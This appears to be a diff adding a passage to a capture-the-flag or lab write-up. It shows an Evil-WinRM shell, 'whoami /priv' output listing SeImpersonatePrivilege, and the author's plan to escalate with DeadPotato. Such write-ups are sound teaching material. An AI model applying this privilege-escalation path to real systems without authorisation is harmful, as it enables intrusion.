@@ -708,4 +708,23 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\sharedadmin\Documents>
 ```
 
+```python
+*Evil-WinRM* PS C:\Users\sharedadmin\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State
+============================= ========================================= =======
+SeMachineAccountPrivilege     Add workstations to domain                Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
+*Evil-WinRM* PS C:\Users\sharedadmin\Documents>
+```
+
+As seen here i now have `SeImpersonatePrivilege`
+
+So ill use DeadPotato to exploit this!
+
 
